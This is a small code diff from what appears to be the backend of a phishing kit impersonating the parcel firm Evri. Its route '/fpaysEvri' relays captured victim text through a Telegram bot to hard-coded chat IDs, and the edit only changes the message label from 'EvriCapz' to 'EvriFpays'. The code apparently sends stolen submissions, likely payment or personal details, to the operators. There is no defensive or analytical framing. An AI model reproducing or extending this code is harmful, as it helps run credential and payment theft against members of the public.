@@ -1954,7 +1954,7 @@ app.post('/fpaysEvri', (req, res) => {
             fpaysC = 0;
         } else {
             axios.post(
-                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriCapz:\n${originalText}`
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
             );
             axios.post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-1001673527655&text=Evri:\n${originalText}`
